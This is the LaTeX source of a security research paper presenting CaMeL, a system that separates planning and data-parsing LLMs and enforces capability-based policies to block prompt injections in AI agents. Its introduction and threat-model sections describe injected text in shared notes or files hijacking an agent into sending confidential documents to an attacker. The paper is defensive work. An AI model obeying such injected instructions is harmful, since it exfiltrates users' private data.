\documentclass[11pt, a4paper, logo, copyright]{googledeepmind}

\usepackage{algorithm}
\usepackage{algpseudocode}

\usepackage[frozencache,cachedir=.]{minted}
\usepackage{lipsum}

\usepackage{cleveref}
\usepackage{subcaption}
\usepackage{wrapfig}
\usepackage{framed}
\usepackage{fancyvrb}
\usepackage{adjustbox}
\usepackage{multirow,multicol}
\usepackage[dvipsnames]{xcolor}
\usepackage{makecell}

\usepackage{listings}
\lstset{
basicstyle=\small\ttfamily,
columns=flexible,
breaklines=true
}

\pdfinfoomitdate 1
\pdftrailerid{redacted}

\usepackage[adversary,operators]{cryptocode}
\renewcommand{\pccomment}[2][1em]{\hspace{#1}{\mbox{// } \text{\scriptsize#2}}}

\makeatletter
\renewcommand\bibentry[1]{\nocite{#1}{\frenchspacing\@nameuse{BR@r@#1\@extra@b@citeb}}}
\makeatother

\usepackage{algorithm}
\usepackage{algorithmicx}

\usepackage{kantlipsum, lipsum}
\usepackage{dsfont}
\usepackage{gdm-colors}
\setlength\parindent{0pt}


\newcommand{\cs}[1]{}
\newcommand{\sh}[1]{}
\newcommand{\ed}[1]{}
\newcommand{\ilia}[1]{}



\usepackage{xspace}
\newcommand{\sysname}{\texttt{CaMeL}\xspace}


\usepackage{csquotes}
\usepackage[
    maxbibnames=20,
    style=authoryear,
    backend=biber,
    natbib=true,
    uniquelist=false,
    uniquename=false,
]{biblatex}
\addbibresource{main.bib}

\graphicspath{{figures/}}
\renewcommand{\today}{}

\input{defns}


\title{\includegraphics[width=0.8cm]{camel.png}Defeating Prompt Injections by Design}

\correspondingauthor{edoardo.debenedetti@inf.ethz.ch \& iliashumailov@google.com\\$^*$Work done as a Student Researcher at Google.}




\author[1,3*]{Edoardo Debenedetti}
\author[2]{Ilia Shumailov}
\author[1]{Tianqi Fan}
\author[2]{Jamie Hayes}
\author[2]{Nicholas Carlini}
\author[1]{\\Daniel Fabian}
\author[1]{Christoph Kern}
\author[2]{Chongyang Shi}
\author[2]{Andreas Terzis}
\author[3]{Florian Tramèr}

\affil[1]{Google}
\affil[2]{Google DeepMind}
\affil[3]{ETH Zurich}

\begin{abstract}
Large Language Models (LLMs) are increasingly deployed in agentic systems that interact with an untrusted environment. However, LLM agents are vulnerable to prompt injection attacks when handling untrusted data. In this paper we propose \sysname{}, a robust defense that creates a protective system layer around the LLM, securing it even when underlying models are susceptible to attacks. To operate, \sysname{} explicitly extracts the control and data flows from the (trusted) query; therefore, the untrusted data retrieved by the LLM can never impact the program flow. To further improve security, \sysname{} uses a notion of a \textit{capability} to prevent the exfiltration of private data over unauthorized data flows by enforcing security policies when tools are called. We demonstrate effectiveness of~\sysname{} by solving $77\%$ of tasks with provable security (compared to $84\%$ with an undefended system) in AgentDojo. \\
\\We release \sysname{} at \url{https://github.com/google-research/camel-prompt-injection}.
\end{abstract}



\begin{document}

\maketitle




\section{Introduction}

Large Language Models (LLMs) are increasingly used as the core of modern \textit{agentic} systems~\citep{wooldridge1995intelligent} interacting with external environments via APIs and user interfaces~\citep{nakano2021webgpt,thoppilan2022lamda,schick2023toolformer,yao2022react,qin2023toolllm,lu2024chameleon,gao2023pal,shen2024hugginggpt}. This exposes them to prompt injection attacks~\citep{goodside,perez2022ignore,greshake2023not} when data or instructions come from untrusted sources (e.g., from a compromised user, from tool call outputs, or from a web page). In these attacks, adversaries insert malicious instructions into the LLM's context, aiming to exfiltrate data or cause harmful actions~\citep{embracethered,googsecblog2025,antropicpromptinj,openaipromptinj}.

Current defenses often rely on training or prompting models to adhere to security policies~\citep{wallace2024instruction, ghalebikesabi2024operationalizing}, frequently implemented as vulnerable system prompts~\citep{carlini2023are}. This is largely due to the absence of robust methods to formally define and enforce security policies for LLM functionalities on diverse data.

This work introduces a novel defense, \textbf{\sysname{}}\footnote{\sysname{} is short for \textbf{CA}pabilities for \textbf{M}achin\textbf{E} \textbf{L}earning.}, inspired by traditional software security concepts like Control Flow Integrity~\citep{abadi2009control}, Access Control~\citep[Chap.~6]{anderson2010security}, and Information Flow Control~\citep{dennind1977certification}. \sysname{} effectively mitigates dangerous outcomes of prompt injection attacks, as demonstrated by practically solving the security evaluation of the AgentDojo benchmark~\citep{debenedetti2024agentdojo}. \sysname associates, to every value, some metadata (commonly called \textit{capabilities}\footnote{Note that here the term \textit{capability} refers to the standard security definition, and not the standard machine learning measurement of how capable models are.} in the software security literature) to restrict data and control flows, giving the possibility to express what can and cannot be done with each individual value by using fine-grained security policies. \sysname{} operates by extracting control and data flows from user queries and employs a custom Python interpreter to enforce security policies, providing security guarantees without modifying the LLM itself. \sysname does not rely on model behavior modification. Instead, it provides an environment where predefined policies prevent unintended consequences caused by prompt injection attacks, mirroring established software security practices.

Overall, we make the following contributions:
\begin{itemize}
	\item We propose \sysname{}, a novel defense inspired by software security that requires no change to the underlying LLM. \sysname{} extracts the control and data flows from user queries and enforces explicit security policies;
	\item We design a custom Python interpreter for \sysname{} that tracks provenance and enforces security policies;
	\item We integrate \sysname{} into AgentDojo~\citep{debenedetti2024agentdojo}, a benchmark for agentic systems security, and demonstrate that we solve it by design with some utility degradation, yet with guarantees that no policy violation can take place.
\end{itemize}

\section{Defeating Prompt Injections by Design}
\begin{wrapfigure}{r}{0.5\linewidth}
	\begin{center}
		\vspace{-3em}
		\includegraphics[width=\linewidth]{figures/example_flows_bob.pdf}
	\end{center}
	\caption{\textbf{Agent actions have both a control flow and a data flow---and either can be corrupted with prompt injections.} This example shows how the query ``Can you send Bob the document he requested in our last meeting?'' is converted into four key steps: (1) finding the most recent meeting notes, (2) extracting the email address and document name, (3) fetching the document from cloud storage, and (4) sending it to Bob. Both control flow and data flow must be secured against prompt injection attacks.} \label{fig:example_flows}
	\vspace{-2em}
\end{wrapfigure}

Consider a user who prompts a model as follows: ``Can you send Bob the document he requested in our last meeting? Bob's email and the document he asked for are in the meeting notes file.'' The user query is straightforward, and the agent is designed to interact with the user's local notes and email functionalities via tool calling. However, the user's notes could be compromised or influenced by malicious actors, who can include (potentially invisible) text with the aim to override the user's instructions, leading to prompt injection attacks~\citep{goodside,perez2022ignore,greshake2023not,pasquini2024neural}. The intended task is to retrieve and send a specific document to a specific recipient, but an adversary might inject prompts to hijack the agent to exfiltrate the document to an unintended email, send another file or do a completely different action altogether (e.g., sending the last email received from the user to an adversary).

\paragraph{How can we defend from these attacks?} Several defenses have been proposed to mitigate such risks. Many methods attempt to make the model itself robust, for example by using delimiters to mark the boundaries of untrusted content within the context, and explicitly instructing the model to disregard any instructions found within these delimiters~\citep{hines2024defending}. Prompt sandwiching~\citep{learnprompting2024sandwich} offers another approach, by repeatedly reminding the model of the original task after each tool output. Further, some researchers explore training or fine-tuning models to become more resilient to prompt injections, enabling them to discern and ignore malicious instructions~\citep{chen2024struq, wallace2024instruction,wu2024instructional}. Unfortunately, none of these heuristic defenses provide any guarantee of security and regularly fall short to new attacks in practice. We discuss prompt injection defenses and concurrent work in more detail in the extended related work in \Cref{app:pi-defenses}.

A significant step forward in defense strategies is the Dual LLM pattern theoretically described by \citet{willison2023dualllm}. This pattern employs two LLMs: a \textit{Privileged} LLM and a \textit{Quarantined} LLM. The \textit{Privileged} LLM is tasked with planning the sequence of actions needed to fulfill the user's request, such as searching the cloud storage for the meeting notes and fetching the requested document from the cloud storage, and sending it to the client. Importantly, this privileged LLM only sees the initial user query and never the content from potentially compromised data sources (like the file content). The actual processing of potentially malicious data, like extracting the name of the document to send and the client's email address, would be delegated to the \textit{Quarantined} LLM. This \textit{Quarantined} LLM, crucially, is stripped of any tool-calling capabilities, limiting the harm an injected prompt can cause and guaranteeing that the adversary cannot call arbitrary tools with arbitrary arguments.

\paragraph{Is Dual LLM of~\citeauthor{willison2023dualllm} enough?}\xspace While the Dual LLM pattern significantly enhances security by isolating planning from being hijacked by malicious content, it does not completely eliminate all prompt injection risks. Let us consider the example depicted in~\Cref{fig:example_flows}. Here, we show that vulnerabilities still exist even with the Dual LLM.

The Privileged LLM, as before, plans the actions: search the cloud storage for ``meeting notes", extract the document to send and the email address with the Quarantined LLM, and send the document to the extracted email address. Now,
consider the following attack: A malicious party with access to the meeting notes adds some text to the notes that influences the Quarantined LLM to send them an arbitrary confidential document. When the agent executes the plan, the Privileged LLM correctly orchestrates the planned steps. However, when the agent retrieves the meeting notes from the cloud storage, the Quarantined LLM is influenced---by the malicious content in the meeting notes---to return data that causes an attacker-chosen file to be sent to an attacker-chosen address.
Thus, even if the global \emph{plan} itself is not hijacked, the \emph{data} being processed according to the plan is manipulated, which can cause malicious actions to be executed. Although this is not strictly a prompt injection (i.e., the attack does not require overriding any LLM instructions), the core issue remains. Even if the adversary cannot change the original plan and tool calls, being able to change the arguments to the tool calls by prompt injecting the Quarantined LLM can be a security issue: while the \emph{control flow} is protected by the Dual LLM pattern, the \emph{data flow} can still be manipulated. This is analogous to an SQL injection attack in which an adversary manipulates the query parameters rather than the structure of the query itself. We show in \Cref{sec:worstcase} that this can be taken one step further and even enable arbitrary code execution.

\paragraph{Defeating prompt injections with software security.}
To address these subtle yet critical vulnerabilities, our system, \sysname{}, draws inspiration from established software security principles (which we discuss in the extended related work in \Cref{app:ac-ifc}), focusing on securing both data and control flows. Let us consider again the query ``Can you send Bob the document he requested in our last meeting? Bob's email and the document he asked for are in the meeting notes file.'', \sysname{} goes beyond just isolating LLMs. It starts by extracting the intended control flow as pseudo-Python code, generated by an LLM that acts as the Privileged LLM of \citet{willison2023dualllm}. \sysname{} then employs a custom interpreter to execute this plan. The interpreter maintains a data flow graph (i.e., tracking which values each variable depends on), and uses it to enforce security policies based on \textit{capabilities} when executing tools. Capabilities are metadata assigned to each value passed to a tool that track the sources and allowed recipients of each value. When the agent accesses the local drive to find the meeting document, the retrieved file is tagged with capabilities reflecting its origin (i.e., the cloud storage and file editors), and its allowed readers (i.e., the email addresses with whom the document is shared).
In this way, even if the adversary was instructing the Quarantined LLM to extract the filename of a confidential file and the email address of the adversary with a prompt injection, the execution of the tool to send the email would be blocked by \sysname{} (and the user asked for explicit approval) as it would imply sharing a confidential document or information from it with someone who is not meant to read the document.\footnote{It should be noted that the user will be asked for explicit approval even in the case where there is no adversary, but Bob does not already have read access to the document. This is because the email address of Bob might be untrusted.}
\begin{wrapfigure}{r}{0.5\linewidth}
	\vspace{-2.5em}
	\begin{center}
		\includegraphics[width=\linewidth]{figures/threatmodeling/threat_model1.pdf}
	\end{center}
	\vspace{-1.5em}
	\caption{\textbf{Prompt injections can cause harm even if they do not change the sequence of agent actions.} Here we consider an adversary who diverts the data flow of the user command. The cloud storage file contains a prompt injection that changes the recipient email address to the attacker's address and the document being sent. This leads to the confidential document being sent to the attacker.}\label{fig:data_injection_attack}
	\vspace{-5em}
\end{wrapfigure}

By enforcing capability-based security policies, \sysname{} effectively prevents unintended data flows and actions. Even with a compromised cloud storage file containing prompt injections targeting the Quarantined LLM, the capabilities system acts as a robust and granular control mechanism, preventing data exfiltration, as well as other prohibited actions. This approach provides a secure environment for LLM agents, preventing harm by design, without requiring modifications to the underlying LLM itself, and offering a significantly more fine-grained and robust defense compared to isolation and/or adversarial training strategies alone.


\section{Threat Model}\label{sec:threat-model}
Building on the security challenges described in the introduction, we now define the specific threats that \sysname{} addresses. The primary goal of \sysname{} is to stop prompt injection attacks coming from untrusted data sources, which constitutes the main risk considered in prompt injection literature. This scenario, described in~\Cref{fig:data_injection_attack}, highlights the danger of processing untrusted data, a practice that is commonplace in current agentic systems. Here, the user prompt first gets processed by the planner model which extracts individual sub-steps that need to be performed (\textbf{control flow graph}) along with what data is used by each individual step (\textbf{data flow graph}). Next, the plan is executed step by step, through interaction with the external tooling. A malicious actor introduces a specially crafted piece of data (such as an email, a document, or a spreadsheet) containing a hidden command or prompt injection, and shares it with the victim, thus making it available for the victim's agentic system to retrieve. As the agent processes this file, the injected command alters the system's behavior. In this example, the prompt injection modifies the recipient's email address within a ``send email'' task, diverting sensitive financial documents to the attacker. This scenario illustrates a data flow-based adversary. We assume that the user prompt is trusted, that the user is not pasting a prompt from an untrusted source, and, if there is a \textit{memory}~\citep{wang2024augmenting} in place, the memory has not been compromised by the adversary.

\subsection{Explicit non-goals of \sysname{}}
\label{sec:nongoals}
\sysname{} has limitations, some of which are explicitly outside of scope. \sysname{} doesn't aim to defend against attacks that do not affect the control nor the data flow. In particular, we recognize that it \textbf{cannot} defend against \textit{text-to-text} attacks which have no consequences on the data flow, e.g., an attack prompting the assistant to summarize an email to something different than the actual content of the email, as long as this doesn't cause the exfiltration of private data. This also includes prompt-injection induced phishing (e.g., ``You received an email from Google saying you should click on this (malicious) link to not lose your account''). Nonetheless, \sysname{}'s data flow graph enables tracing the origin of the content shown to the user. This can be leveraged, in the chat UI, for example, to present the origin of the content to the user, who then can realize that the information is not from a Google email address.

Furthermore, \sysname{} does not aim to make a fully autonomous system without any need for human intervention. As users often make ambiguous queries (or tools might return ambiguous results), users may sometimes need to be prompted to clarify the expected control and data flows. However, as we describe in the following section, using capabilities and security policies enables \sysname to avoid unnecessarily prompting the user and shifts important security-related decisions to the capability system, thereby reducing the risk of security fatigue and user desensitization.

\begin{figure}[t]
	\centering
    \small
    \begin{minipage}{\linewidth}
        \input{figures/game}
    \end{minipage}
	\caption{\textbf{Formalization of the Prompt Injection security game.} The adversary $\adv$ needs to create a state $\mem^*$ which causes the agent to take an action which is not part of the set of allowed actions $\Omega_\text{prompt}$ for the given prompt.}\label{fig:pi-sec-game}
\end{figure}

\begin{figure}
	\centering
	\begin{minipage}{\textwidth}
		\include{figures/algo}
	\end{minipage}
	\caption{\textbf{\sysname{} in the PI-SEC security game.} The \sysname{} $\agent$ takes as argument some $\policies$ which govern globally-allowed actions for the provided $\tools$ (i.e., independently of the $\prompt$). The policies are checked against before each tool call. If the check fails (i.e., the policy returns $\perp$, then execution is halted.}\label{fig:camel-algo}
\end{figure}

\section{The Prompt Injection Security Game}\label{sec:sec-game}

We formalize the threat model described in \Cref{sec:threat-model} as the security game \textbf{PI-SEC} defined in \Cref{fig:pi-sec-game}. This game takes as parameters an adversary $\adv$, an $\agent$, and a set of tools that the $\agent$ can use. The $\agent$ is a procedure that takes as input a user prompt, the set of tools, and a memory $\mem$ (i.e., a read-writable state on which the tools operate). It executes the prompt, and returns a $\Trace$, i.e., a set of (tool, args, $\mem_\text{step}$) tuples which represent the tools called by the $\agent$ while executing the prompt, the arguments passed to the tool, and the memory at the time of execution.

For each $\prompt$, the set $\actions$ represents the set of \emph{allowed actions}, i.e., actions that the $\agent$ can take without compromising security.\footnote{This set $\actions$ is only used as part of the security definition and not as part of any design of \sysname{}.}
The adversary's goal is to provide an initial \emph{adversarial state} $\mem^*$ for the $\agent$'s tools, in order to cause the $\agent$ to perform an unsafe action (i.e., one that is not part of $\actions$).
If the Agent's execution $\trace$ contains such an action, the adversary $\adv$ wins.

\section{\sysname{} Design}

\begin{figure}[t]
	\centering
	\includegraphics[width=\linewidth]{system_diagram_v2.pdf}
	\caption{\textbf{Diagram illustrating how \sysname{} processes a user's query.} First, the \pllm generates code that expresses the submitted query. Then, the \sysname{} interpreter constructs and updates a data flow graph, checks security policy based on code execution, and either executes or blocks tools. The \qllm is used to parse untrusted data while interpreting the code.}
	\label{fig:system_diagram}
\end{figure}

A trivial way to satisfy the security definition from \Cref{sec:sec-game} would be to enumerate the full set of allowable actions $\actions$ for each possible prompt and just check that the $\agent$ never executes a disallowed action. However, this would be entirely impossible in practice. For this reason, we design a system that uses principles from software security such as control-flow integrity, capabilities, and security policies to prevent the $\agent$ from executing disallowed actions without the need to exhaustively enumerate them.

Our system, depicted in~\Cref{fig:system_diagram}, combines the following components:
\begin{itemize}
	\item \textbf{the \isolated}: an LLM tasked with parsing unstructured data to structured data;
	\item \textbf{the \rewriter}: an LLM generating code that expresses the user query;
	\item \textbf{tools}: subroutines which can be invoked by the system to execute specific tasks via predefined APIs (e.g., a tool to send an email);
	\item \textbf{security policies}: functions that define what is and what is not allowed when calling tools;
	\item \textbf{capabilities}: tags assigned to each value that are used to store the value's sources and allowed readers;
	\item \textbf{the \sysname{} interpreter}: an orchestrator interpreting the code written by the \rewriter, propagating capabilities, and enforcing security policies.
\end{itemize}

We also represent the system in relation to the \textbf{PI-SEC} security game in \Cref{fig:camel-algo}. Here, the $\agent$ takes as an extra argument some global $\policies$, which model the set of allowed actions $\actions$ for the provided $\tools$.

We now cover each of these components in more detail.

\subsection{The Privileged and Quarantined LLMs}\label{sec:design-llms}

To the best of our knowledge, \sysname{} represents the first concrete instantiation of the Dual-LLM pattern~\citep{willison2023dualllm} using a \rewriter and a \isolated. The \isolated (\qllm) is a large language model that has no tool access and can be used to parse unstructured data into data with a predefined schema via a feature commonly called \textit{structured output} by LLM providers and is built-in for most large language models. On top of the fields provided as part of the schema, we inject one additional boolean field (called \pythoninline{have_enough_information}) that the Quarantined LLM can use to communicate that it was not provided with enough information to solve the assigned task. If this field is \texttt{false}, then the \sysname interpreter throws a \pythoninline{NotEnoughInformationError} and the \pllm is asked to generate different code to fix the error (like with other exceptions, as explained below). Importantly, the \qllm cannot communicate to the \pllm what information it needs, as this could be a vector for prompt injections.

The \rewriter (\pllm), instead, takes a natural language input describing a task (e.g., a request for the agent), and writes Python code which expresses the query intent by leveraging the tools, the standard library functions that are made available to it, and the \qllm (which is presented to the \pllm as a function to call, just like the aforementioned tools). As part of the code, it must also specify the expected schema for each call to the \qllm, in the form of a Pydantic BaseModel~\citep{pydantic}. Crucially, the \pllm{} only interacts with the user query and not the data returned by tools or with the \qllm output: values returned by tools are stored in variables, and the \pllm can only see the code it generated and not the variable's content. The \pllm{} uses the \qllm{} as a function and only passes to it information required for the task, tracking provenance. There is explicit isolation between the models to ensure that data can't influence the original user query execution plan.

The \pllm receives a system prompt that includes details on the code that is expected and the list of tools and classes available to it (in the form of Python function signatures). We additionally include some of the AgentDojo system prompt (e.g., the user's name and some extra instructions related to each environment). We provide the full system prompt in \Cref{app:system-prompt}.
Then, in form of a user prompt, the \pllm is given the user's task. The \pllm responds with some text that must include a code block in Markdown format, i.e., wrapped by triple backquote characters (\texttt{\lq}). The \pllm can show content to the user by calling the \pythoninline{print} function.

Although we use the same backbone LLM for both the P-LLM and the Q-LLM, in practice they could be different. As parsing data is likely to be easier than creating a plan and writing code for the user's query, a weaker language model could be used for the Q-LLM. On top of being faster and cheaper, this LLM could also be run locally on the user's machine (whereas the more powerful P-LLM might require using a proprietary model). This improves privacy\footnote{In a data minimization paradigm similar to that used in federated learning~\citep{mcmahan2023communicationefficientlearningdeepnetworks}.}
with respect to the model provider: since the P-LLM only receiver the user query, the P-LLM provider never sees the tool outputs (which might contain sensitive information). This is different from the commonplace tool-calling loop, where the LLM provider decides which tools see other tool outputs for multi-step tool uses.

\subsection{Security Policies}\label{subsec:policies}

\begin{figure}
	\centering
	\begin{mintedbox}[autogobble,fontsize=\small]{python}
		def create_calendar_event_policy(
		self, tool_name: str, kwargs: Mapping[str, CaMeLValue]
		) -> SecurityPolicyResult:
		# Data: title, description, location, start_time, end_time
		# Readers: participants
		# Rationale:
		# Title, description, location, start_time, end_time should be readable by the participants or all participants should come from user
		participants: List[CaMeLStr] = kwargs["participants"]  # type: ignore
		if is_trusted(participants): # If the list of participant directly comes from a trusted source, execute the tool
		return Allowed()
		participants_set = set(participants.raw)
		if not can_readers_read_value(participants_set, kwargs["title"]):
		return Denied("The title is not public or shared with the recipients")
		# Same check for description, location, start_time, end_time
		# ...
		return Allowed()
	\end{mintedbox}
	\caption{\textbf{\sysname's security policies can be as expressive as Python.} Example of security policy for the AgentDojo tool which creates a calendar event. All other policies used in the evaluation are released with the code.}
	\label{fig:example_calendar_security_policy}
\end{figure}

Security Policies define allowed operations in the information flow. For example, data labeled as not readable by anyone but the user should not be supplied to a state-changing tool (e.g., a tool that sends emails or that requests a web page). Security policies can be defined globally by the entity serving the engine or for allowing specific data flows to a specific tool (e.g., sharing a document as an attachment of an email whose recipients already have access to the document). Note that security policies can be extremely granular and flexible: \Cref{fig:example_calendar_security_policy} shows an example of a calendar policy. Here, the policy explicitly states that the data that are part of the calendar event (e.g., the title and the description) must be readable by the participants. However, it also states that, if all participants come from a trusted source (e.g., directly from the user), then data can be shared with them even if the calendar information has not been shared with them previously. In practice the choice of annotations, their granularity, and levels of access are defined based on a specific use-case.

In our implementation, policies are defined by the \sysname{} engine. However, our design allows for a more granular and multi-party model in the future. We envision a system where users and tool-providers can also set their own policies, or where policies can be automatically derived from context. Policies are expressed as Python functions, as shown in~\Cref{fig:example_calendar_security_policy}. Each function takes the tool name and arguments as input and returns a \pythoninline{SecurityPolicyResult} expressed as \pythoninline{Allowed} or \pythoninline{Denied}, along with a reason for the decision. We opted to use Python code over a custom DSL to allow for arbitrary logic to be implemented within the policy.

\subsection{Capabilities}

Capabilities consist of tags assigned to each individual value that describe control and data-flow relationships. For example, capabilities can describe the provenance of a piece of data and who can read it. These capabilities can be used to restrict operations for individual data, and allow for a more fine-grained control than just restricting specific data or control flows. The current implementation of \sysname{} tags data with information on data provenance and a set of allowed readers. Readers are expressed as either the \pythoninline{Public} singleton (i.e., everyone can access the data), or as a set of users, (e.g., identified by their email addresses). Data provenance is tagged as coming from the \pythoninline{User} (i.e., all literals in the code generated by the \pllm), from \sysname (i.e., the results of all transformations done during code execution), or from a given tool (identified with a unique identifier). Tools can also identify an inner source, i.e., the origin of the data within the tool. For example, the \pythoninline{read_email} tool tags the sender of a given email as an inner source. Tools can also assign capabilities, depending on their functionality. For example, a cloud storage tool can tag a document's provenance with the document editors. In practice, capabilities define arbitrary restrictions on any data. Our fine-grained capabilities draw inspiration from established systems in the computer security literature, like \texttt{libcap}~\citep{libcap}, \texttt{Capsicum}~\citep{watson2010capsicum}, and \texttt{CHERI}~\citep{woodruff2014cheri,watson2015cheri}.


\textbf{Why do we need capabilities if we have both data and control flow?} While control and data flows can define coarse-grained invalid execution sequences, they can be restrictive and cause significant utility loss. Capabilities offer a more fine-grained approach by precisely defining, for each individual data, what can be done with that data. For example, a restaurant booking tool might legitimately handle telephone numbers and names (forms of personally identifiable information or PII), while other sensitive PII like passport and social security numbers should never be supplied to untrusted tools. A policy that broadly allows all PII to flow indiscriminately into the booking tool could compromise user privacy. At the same time, defining control flow policies for each individual PII type would be inefficient and difficult to manage long-term. Instead, one can tag a particular value, e.g. a passport number and its derivatives, as not-processable by any tool other than specific trusted ones, e.g., government-provided tools.

\subsection{\sysname Interpreter}\label{sec:interpreter}

\begin{figure}
	\centering
	\begin{subfigure}[b]{.50\textwidth}
		\centering
		\begin{mintedbox}[autogobble]{python}
			email = get_emails(1)[0]
			date = get_current_day()
			if query_ai_assistant(
			"Is this email about a meeting on"
			"the day after {date}?\n{email}", bool
			):
			send_email(
			email.body, email.subject,
			"email@example.com"
			)
		\end{mintedbox}
		\caption{Code that expresses the natural language query.}
		\label{fig:camel-code}
	\end{subfigure}%
	\hfill
	\begin{subfigure}[b]{.48\textwidth}
		\centering
		\includegraphics[width=\linewidth]{dep-graph-camel}
		\caption{Dependency graph of the code}
		\label{fig:camel-dep-graph-strict}
	\end{subfigure}
	\caption{\textbf{\sysname generates code to facilitate tracking data dependencies.} Example code and dependency graph generated by \sysname for the natural language query ``If my last email is about a meeting tomorrow, forward it to email@example.com''. Notice that in the dependency graph, generated with \sysname's \pythoninline{STRICT} mode, the call to \pythoninline{send_email} also has a dependency on the call to \isolated, hence on \pythoninline{date}. This is to account for the fact that the call to \pythoninline{send_email} depends on the conditional given by the call to \isolated, and hence could reveal side-channel information. The dependency graph generated in \pythoninline{NORMAL} mode can be found in \Cref{fig:camel-dep-graph-normal}.}
	\label{fig:code-and-graph}
\end{figure}

We build a custom Python interpreter that operates over a restricted version of Python. We choose Python as it is a very popular programming language, and large language models are very competent at writing it. We use Python's built-in \pythoninline{ast} library to parse the abstract syntax tree, and interpret each tree node in a recursive fashion. More details on the restrictions we place on the language can be found in the \pllm system prompt (\Cref{app:system-prompt}). In our evaluations we find that minor prompt modification gets the model to generate code that is within our subset of Python, and some violations of the dialect are easily detectable and fixable automatically.

\paragraph{Error handling.} The interpreter prompts the \pllm up to 10 times to get code that fully runs. If an exception is raised, then the exception location and type (similarly to how it would be formatted by a real Python interpreter) are presented to the \pllm, together with a prompt asking the LLM to fix the code. (full prompt in \Cref{app:exceptions-prompt}).
Note that, however, the exception content must be handled with care: if the exception has a dependency on untrusted data (e.g., the text comes from or has a dependency on an untrusted tool output), it could potentially contain a prompt injection. The error message is then redacted, and a message explaining the redaction is provided to the \pllm. As some tool calls have side-effects (e.g., they might create a calendar event), the model is told to assume that the code up to the point where the exception was raised was already run and that it can use all variables that have been defined in the code that it will generate. Of course, the interpreter state (e.g., defined variables and classes, with all their dependencies and capabilities) is preserved between the different code runs. At present \sysname{} has no means to enable atomicity for sequences of instructions or rollbacks of operations that failed yet had side-effects.

\paragraph{Maintaining the data flow graph.} While executing the code, the \sysname interpreter also tracks the dependencies of each variable (i.e., the information flow). For example, in the code \pythoninline{c = a + b}, variable \pythoninline{c} will depend on both \pythoninline{a} and \pythoninline{b}. When needed (e.g., for checking security policies), the entire dependency graph of a variable is built by recursively traversing all its dependencies. Special care is taken for control-flow constructs (e.g., \pythoninline{if} statements and \pythoninline{for} loops): the \sysname interpreter has two interpretation modes: a \pythoninline{STRICT} and a \pythoninline{NORMAL} mode. In strict mode, we add the conditional test or loop iterable as a dependency to all variables assigned in the control flow block, which has security implications as we discuss later in~\Cref{sec:side-channels}. For example, in the code in \Cref{fig:camel-code}, the variable \pythoninline{result} will have a dependency on the variable \pythoninline{email} and on the string literal in the prompt, as shown in \Cref{fig:code-and-graph}. As the current implementation of \sysname does not allow to define new functions, and the functions currently available are not recursive, handling the data flow graph in the case of recursive functions is not a concern.

\textbf{Enforcing security policies.} Before executing a tool with a given set of variables as input, relevant security policies are applied to that variable and its dependencies, as identified by the dependency graph. If a policy violation is detected (e.g., private data passed to a tool with side effects), the tool's execution is blocked. In a real-world application, executions that violate security policies will not be blocked, but they will require user confirmation.

\section{Evaluation}

We evaluate our design on AgentDojo~\citep{debenedetti2024agentdojo}, a recent agentic security benchmark. We evaluate on it as it comprises a set of realistic utility and security tasks in agentic, tool-calling scenarios. We touch upon utility, i.e., how tasks are solved by the agent with acceptable levels of detail, and security, i.e., attacks against the agent don't succeed in their adversarial goal.

\subsection{Utility evaluation}

The AgentDojo benchmark includes tasks from many domains, including Workspace, Banking, Travel, and Slack. We measure each model's success rate in completing these tasks with \sysname{} enabled and by using the official tool-calling APIs from each model provider. We evaluate \texttt{gemini\--2.5\--flash\--preview\--05-20}, \texttt{gemini\--2.5\--pro\--preview\--05\--06}, \texttt{claude\--3\--5\--haiku\--20241022}, \texttt{claude\--sonnet\--4\--20241022} (without reasoning), \texttt{claude\--sonnet\--4\--20241022} (with $16,000$ reasoning tokens budget), \texttt{gpt\--4.1\--2025\--04\--14}, \texttt{o4\--mini\--2025\--04\--16} (with \textit{high} reasoning effort), and \texttt{o3\--2025\--04\--16} (with \textit{high} reasoning effort).

\subsubsection{\sysname{} has a (small) Impact on Utility}

\Cref{fig:utility-results} reports the performance of different language models with \sysname{} and with the official tool-calling APIs. With an exception of Travel suite--on a subset of models--we find that \sysname{} does not significantly degrade utility. We discuss the Travel suite in detail below. Quite unexpectedly, in rare cases, we find that \sysname{} even improves the success rate of certain models on specific suites. Finally it is worth noting that the performance of models using CaMeL significantly improved in a second round of experiments where we employed more recent models. For example, OpenAI's o3 has around $10\%$ more utility than o1, which is less than four months older than o3.

\begin{figure}[ht]
	\centering
	\includegraphics[width=\linewidth]{results/utility-results-breakdown.pdf}
	\caption{\textbf{\sysname (mostly) provides usable performance.} With the exception of the travel suite (which we discuss below), \sysname does not excessively degrade utility when compared to Native Tool Calling APIs. In fact, for some models and suites, it even improves utility. Claude 4 Sonnet* is Claude 4 Sonnet with reasoning. Full results in~\Cref{tab:utility}}
	\label{fig:utility-results}
\end{figure}

\subsubsection{How does \sysname{} impact utility?}

To better understand the impact of \sysname{} on utility, we analyze the failure modes of Claude 3.5 Sonnet across the different task suites. We pick Claude 3.5 Sonnet due to relatively high performance across all of the tasks. We categorize failures and show the amount for each category in \Cref{tab:combined_failures_claude}. \Cref{tab:individual_failures} in~\Cref{sec:breakdown_failuremode} provides a breakdown of Claude's failures for each task. \Cref{sec:failed_task_examples} provides examples of failed tasks with the description of the failure and the whole agent interaction.
We now discuss the failure modes related to the nature of \sysname.

\textbf{The \pllm cannot write a plan based on data it can't read.} One failure mode that is inherent to \sysname (and in general to the Dual LLM Pattern) is what we call the ``Data requires action'' failure, where the actions to take depend on untrusted data. For example, the workspace suite includes the query ``Please do the actions specified in the email from `david.smith@bluesparrowtech.com' with the subject `TODOs for the week'.''. In this case, the \pllm does not know what the required actions are, and the task cannot be solved. While many models try to solve this by partially implementing a tool-calling loop, no existing model manages to solve this task. This can be potentially solved by providing the \pllm with an extra tool which consists of another instance of a \pllm. This tool would generate and execute a plan based on the arguments it is provided with. Of course, security policies for executing this tool should be very strict and allow its execution only if the inputs come from a trusted source.

\textbf{\sysname struggles with poorly documented APIs.} We observe that the low performance on the Travel suite mostly comes from the fact that the tool outputs structure is not well documented. The \pllm does not have a way to observe the format of the output of these tools, and, as a consequence, cannot parse them. However, while this was the case for most older models during the first round of experiments, most newer models realize this, and use the \qllm to parse data that is otherwise impossible to parse without knowing the structure. This ability alone enables models to solve dramatically more tasks in the travel suite. For example, for the Claude Sonnet family, the utility on the travel suite went from $25\%$ (3.5), to $55\%$ (3.7), to $75\%$ (4), with no changes in \sysname{} and its system prompt.

